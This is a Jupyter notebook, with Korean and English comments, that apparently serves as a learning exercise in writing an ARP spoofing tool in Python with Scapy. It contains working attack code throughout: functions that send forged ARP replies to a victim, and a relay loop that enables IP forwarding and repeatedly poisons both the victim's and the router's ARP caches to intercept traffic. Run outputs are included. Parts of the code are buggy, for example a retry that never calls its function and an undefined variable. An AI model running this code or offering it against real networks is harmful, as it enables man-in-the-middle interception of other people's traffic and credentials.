{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ARP Spoofing with python\n",
    "----"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "import 들"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "from uuid import getnode\n",
    "import socket\n",
    "import ipaddress\n",
    "import os\n",
    "import sys\n",
    "import argparse\n",
    "import signal\n",
    "import logging\n",
    "import time"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "root인지 check."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#You should be root.\n",
    "if os.geteuid() != 0:\n",
    "        sys.exit(\"Please run as root\") "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "## 1. Send 1 ARP spoofing packet to victim."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We need victim's ip, victim's mac and Gateway's ip, mac.\n",
    "Also, my ip and mac.\n",
    "We will find out those through arp packet.\n",
    "    \n",
    "* get_my_address : 자신의 ip와 mac을 구해온다.\n",
    "* get_gateway_address : gateway address를 구해온다.\n",
    "* get_mac_by_ARP : ip에 대해 arp request를 보내서 mac address를 구해온다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`p=sr1(ARP(op=ARP.who_has, pdst=dstip))`를 통해 destination ip에 관해 arp request를 보내고, 그에 대한 reply를 받은 p를 바로 return받을 수 있다."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "#function to get host's ip, mac address\n",
    "#return ip address, mac address\n",
    "def get_my_address():\n",
    "\n",
    "    #using getnode\n",
    "    mac = \"\".join(c + \":\" if i % 2 else c for i, c in enumerate(hex(getnode())[2:].zfill(12)))[:-1]\n",
    "    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n",
    "    s.connect((\"gmail.com\",80))\n",
    "    ip = s.getsockname()[0]\n",
    "\n",
    "    return ip, mac\n",
    "\n",
    "#really bad idea. just put 1 at last 4byte, but work nicely in my computer!!\n",
    "def get_gateway_address(ip):\n",
    "\n",
    "    li = ip.split('.')\n",
    "    res = li[0] + '.' + li[1] + '.' + li[2] + '.' + '1'\n",
    " \n",
    "    return res\n",
    "\n",
    "#send arp request packet, and get answer from that to figure out mac address.\n",
    "def get_mac_by_ARP(dstip):\n",
    "    #sr1 is function that can request and response simultaniously.\n",
    "    p=sr1(ARP(op=ARP.who_has, pdst=dstip),timeout=2.0)\n",
    "    if not (p is None):\n",
    "        return p.hwsrc\n",
    "    else:\n",
    "        return (-1)    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#send arp spoofed packet.\n",
    "#src_mac should be our mac, src_ip should be gateway, destination is victim's\n",
    "def send_ARPreply(src_mac, src_ip, dst_mac, dst_ip):\n",
    "\n",
    "    packet = Ether()/ARP(op=\"who-has\",hwsrc=src_mac,psrc=src_ip,pdst=dst_ip)\n",
    " \n",
    "    sendp(packet)\n",
    "    return packet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Integration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def ARP_spoofing():\n",
    "    \n",
    "    my_ip, my_mac = get_my_address()\n",
    "    gateway_ip = get_gateway_address(my_ip)\n",
    "    gateway_mac = get_mac_by_ARP(gateway_ip)\n",
    "\n",
    "    print \"Your ip address is : \" , my_ip , \"\\nYour mac address is : \" , my_mac\n",
    "    print \"Gateway's ip address is : \" , gateway_ip, \"\\nGateway's mac address is : \", gateway_mac\n",
    "\n",
    "    victim_ip = raw_input(\"Please enter Victim's ip address(XXX.XXX.XXX.XXX) : \")\n",
    "    victim_mac = get_mac_by_ARP(victim_ip)\n",
    "    if not (victim_mac is -1):\n",
    "        print \"Victim's ip address is : \", victim_ip, \"\\nVictim's mac address is : \", victim_mac\n",
    "        send_ARPreply(my_mac, gateway_ip, victim_mac, victim_ip)\n",
    "        return 1\n",
    "    else:\n",
    "        print \"Timeout. Maybe \", victim_ip, \"is not exist\"\n",
    "        check = raw_input(\"If you want to try again, Enter y.\")\n",
    "        if check is \"y\":\n",
    "            ARP_spoofing\n",
    "        else:\n",
    "            return -1\n",
    "    \n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: __del__: don't know how to close the file descriptor. Bugs ahead ! Please report this bug.\n",
      "WARNING: __del__: don't know how to close the file descriptor. Bugs ahead ! Please report this bug.\n",
      "WARNING:scapy.runtime:__del__: don't know how to close the file descriptor. Bugs ahead ! Please report this bug.\n",
      "WARNING:scapy.runtime:__del__: don't know how to close the file descriptor. Bugs ahead ! Please report this bug.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Received 2 packets, got 1 answers, remaining 0 packets\n",
      "Your ip address is :  192.168.0.176 \n",
      "Your mac address is :  ac:bc:32:86:66:e9\n",
      "Gateway's ip address is :  192.168.0.1 \n",
      "Gateway's mac address is :  00:08:9f:b5:d0:14\n",
      "Begin emission:\n",
      "Finished to send 1 packets.\n",
      "Please enter Victim's ip address(XXX.XXX.XXX.XXX) : 123.123.123.123\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: __del__: don't know how to close the file descriptor. Bugs ahead ! Please report this bug.\n",
      "WARNING:scapy.runtime:__del__: don't know how to close the file descriptor. Bugs ahead ! Please report this bug.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Received 1 packets, got 0 answers, remaining 1 packets\n",
      "Timeout. Maybe  123.123.123.123 is not exist\n",
      "Begin emission:\n",
      "Finished to send 1 packets.\n",
      "If you want to try again, Enter y.n\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "-1"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ARP_spoofing()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "## 2. ARP spoofing relay."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "Spoofing relay is needed to keep victim's arp table poisoned.\n",
    "* 중간에서 실제 패킷의 교환이 가능하게끔 할 것.\n",
    "* 주기적으로 spoofing packet을 보낼 것."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### python을 이용한 arp spoofing packet relay 예시\n",
    "\n",
    "Reference : [참조 링크](http://cpuu.postype.com/post/41330/)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "# sudo python arp_spoof.py -v 192.168.0.3 -r 192.168.0.1\n",
    "\n",
    "logging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n",
    "\n",
    "def poison(routerIP, victimIP, routerMAC, victimMAC):\n",
    "    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))\n",
    "    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))\n",
    "\n",
    "def restore(routerIP, victimIP, routerMAC, victimMAC):\n",
    "    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=\"ff:ff:ff:ff:ff:ff\", hwsrc=victimMAC), count=3)\n",
    "    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=\"ff:ff:ff:ff:ff:ff\", hwsrc=routerMAC), count=3)\n",
    "    sys.exit(\"losing...\")\n",
    "\n",
    "def get_Input():\n",
    "    \n",
    "    victim_ip = raw_input(\"Please enter Victim's ip address(XXX.XXX.XXX.XXX) : \")\n",
    "    victim_mac = get_mac_by_ARP(victim_ip)\n",
    "    if not (victim_mac is -1):\n",
    "        print \"Victim's ip address is : \", victim_ip, \"\\nVictim's mac address is : \", victim_mac      \n",
    "    else:\n",
    "        print \"Timeout. Maybe \", victim_ip, \"is not exist\"\n",
    "        check = raw_input(\"If you want to try it again, Enter y.\")\n",
    "        if check is \"y\":\n",
    "            get_Input()\n",
    "        else:\n",
    "            return None\n",
    "\n",
    "    gateway_ip = get_gateway_address(my_ip)\n",
    "    gateway_mac = get_mac_by_ARP(gateway_ip)\n",
    "    \n",
    "    return gateway_ip, victim_ip, gateway_mac, victim_mac\n",
    "\n",
    "def ARP_spoofRelay():\n",
    "    if os.geteuid() != 0:\n",
    "        sys.exit(\"[!] Please run as root\")\n",
    "    \n",
    "    routerIP, victimIP, routerMAC, victimMAC = get_Input()\n",
    "    if(routerIP is 1):\n",
    "        sys.exit(\"Fail to get. Closing....\")\n",
    "    print \"-----------------------------------------------\"\n",
    "    print 'routerIP : ' + routerIP\n",
    "    print 'victimIP : ' + victimIP\n",
    "    print 'routerMAC : ' + routerMAC\n",
    "    print 'victimMAC : ' + victimMAC\n",
    "    if routerMAC == None:\n",
    "        sys.exit(\"Could not find router MAC address. Closing....\")\n",
    "    if victimMAC == None:\n",
    "        sys.exit(\"Could not find victim MAC address. Closing....\")\n",
    "    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:\n",
    "        ipf.write('1\\n')\n",
    "    def signal_handler(signal, frame):\n",
    "        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:\n",
    "            ipf.write('0\\n')\n",
    "        restore(routerIP, victimIP, routerMAC, victimMAC)\n",
    "    signal.signal(signal.SIGINT, signal_handler)\n",
    "    while 1:\n",
    "        poison(routerIP, victimIP, routerMAC, victimMAC)\n",
    "        time.sleep(1.5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Please enter Victim's ip address(XXX.XXX.XXX.XXX) : 123.123.123.123\n",
      "\n",
      "Received 3 packets, got 0 answers, remaining 1 packets\n",
      "Timeout. Maybe  123.123.123.123 is not exist\n",
      "Begin emission:\n",
      "Finished to send 1 packets.\n",
      "If you want to try it again, Enter y.n\n",
      "Closing.....\n"
     ]
    }
   ],
   "source": [
    "args = get_Input()\n",
    "if args is not None:\n",
    "    ARP_spoofRelay(args)\n",
    "else:\n",
    "    print \"Closing.....\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
